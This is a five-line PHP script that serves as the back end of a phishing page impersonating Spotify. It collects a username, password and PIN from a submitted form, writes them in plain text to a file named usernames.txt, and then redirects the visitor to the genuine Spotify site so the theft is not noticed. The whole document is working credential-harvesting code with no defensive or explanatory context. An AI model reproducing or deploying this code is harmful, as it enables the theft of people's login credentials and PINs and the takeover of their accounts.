<?php
file_put_contents("usernames.txt", "Spotify Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . " PIN: " . $_POST['pin'] . "\n", FILE_APPEND);
header('Location: https://www.spotify.com/in');
exit();
?>